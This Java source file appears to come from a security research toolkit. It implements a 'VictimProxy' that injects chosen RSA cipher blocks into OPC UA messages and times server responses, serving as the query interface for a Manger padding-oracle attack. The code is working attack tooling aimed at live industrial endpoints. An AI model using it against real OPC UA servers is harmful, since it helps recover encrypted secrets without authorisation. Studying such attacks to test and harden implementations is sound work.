package attacks.manger.oracle;

import attacks.CipherTextUtility;
import opcua.context.Endpoint;
import opcua.context.StaticConfig;
import opcua.message.Message;
import transport.MessageReceiver;
import transport.TransportException;
import transport.tcp.HighPrecisionTimingClientTcpConnection;
import transport.tcp.TcpClientUtil;

import java.io.IOException;
import java.math.BigInteger;

/**
 * Servers as interface to the target server. Helps querying cipher blocks.
 */
public class VictimProxy {
    private final Endpoint endpoint;
    private final byte[] ciphertext;
    private final int blockOffset;
    private final int blockSize;
    private final int blockNumber;

    /**
     * Constructor (assumes that the 0th cipher block is replace)
     * @param endpoint Endpoint to attack
     * @param ciphertext Valid ciphertext to insert queried cipher blocks into
     * @throws IOException
     */
    public VictimProxy(Endpoint endpoint, byte[] ciphertext) throws IOException {
        this.endpoint = endpoint;
        this.ciphertext = ciphertext;
        this.blockOffset = CipherTextUtility.getOpnBlockOffset(ciphertext, endpoint.getPublicKey());
        this.blockNumber = 0;
        this.blockSize = endpoint.getPublicKey().getModulus().bitLength() / 8;
    }

    /**
     * Constructor
     * @param endpoint Endpoint to attack
     * @param ciphertext Valid ciphertext to insert queried cipher blocks into
     * @param blockNumber Which cipher block to replace
     * @throws IOException
     */
    public VictimProxy(Endpoint endpoint, byte[] ciphertext, int blockNumber) throws IOException {
        this.endpoint = endpoint;
        this.ciphertext = ciphertext;
        this.blockOffset = CipherTextUtility.getOpnBlockOffset(ciphertext, endpoint.getPublicKey());
        this.blockNumber = blockNumber;
        this.blockSize = endpoint.getPublicKey().getModulus().bitLength() / 8;
    }

    /**
     * Constrcutor
     * @param endpoint Endpoint to attack
     * @param ciphertext Valid ciphertext to insert queried cipher blocks into
     * @param blockOffset Offset of the first cipher block
     * @param blockNumber Which cipher block to replace
     */
    public VictimProxy(Endpoint endpoint, byte[] ciphertext, int blockOffset, int blockNumber) {
        this.endpoint = endpoint;
        this.ciphertext = ciphertext;
        this.blockOffset = blockOffset;
        this.blockNumber = blockNumber;
        this.blockSize = endpoint.getPublicKey().getModulus().bitLength() / 8;
    }

    /**
     * Inserts cipher block into valid ciphertext and queries target server
     * @param cipherBlock Cipher block to query
     * @return Response and response time
     * @throws OracleException
     */
    public QueryResult sendCipherBlock(byte[] cipherBlock) throws OracleException {
        if(cipherBlock.length != blockSize) {
            throw new IllegalArgumentException("Invalid block size");
        }

        CipherTextUtility.insertCipherBlock(ciphertext, cipherBlock, blockOffset, blockSize, blockNumber);

        try {
            HighPrecisionTimingClientTcpConnection timingConnection = new HighPrecisionTimingClientTcpConnection(endpoint.getHostName(), endpoint.getPort(), StaticConfig.TIMEOUT);
            timingConnection.initialize();
            TcpClientUtil.initializeTcpTransportConnection(timingConnection, endpoint);

            long timing = timingConnection.timedSendData(ciphertext);
            Message response = MessageReceiver.receiveMessage(timingConnection, endpoint.getMessageSecurityMode());

            timingConnection.close();

            return new QueryResult(response, timing);

        } catch (TransportException e) {
            throw new OracleException(e);
        }
    }

    /**
     * Encrypts plainBlock with public key and use resulting cipher block to query target server
     * @param plainBlock Plaintext block to encrypt and query
     * @return Response and response time
     * @throws OracleException
     */
    public QueryResult sendEncryptedPlainBlock(byte[] plainBlock) throws OracleException {
        if(plainBlock.length != blockSize) {
            throw new IllegalArgumentException("Invalid block size");
        }

        byte[] c = new BigInteger(1, plainBlock)
                .modPow(endpoint.getPublicKey().getPublicExponent(), endpoint.getPublicKey().getModulus())
                .toByteArray();

        byte[] cipherBlock = new byte[blockSize];
        if(c.length >= blockSize) {
            System.arraycopy(c, c.length-blockSize, cipherBlock, 0, blockSize);
        }
        if(c.length < blockSize) {
            System.arraycopy(c, 0, cipherBlock, blockSize-c.length, c.length);
        }

        return sendCipherBlock(cipherBlock);
    }



    public class QueryResult {
        private final Message response;
        private final long responseTime;

        QueryResult(Message response, long responseTime) {
            this.response = response;
            this.responseTime = responseTime;
        }

        public Message getResponse() {
            return response;
        }

        public long getResponseTime() {
            return responseTime;
        }
    }



    public int getBlockSize() {
        return blockSize;
    }

    public Endpoint getEndpoint() {
        return endpoint;
    }
}
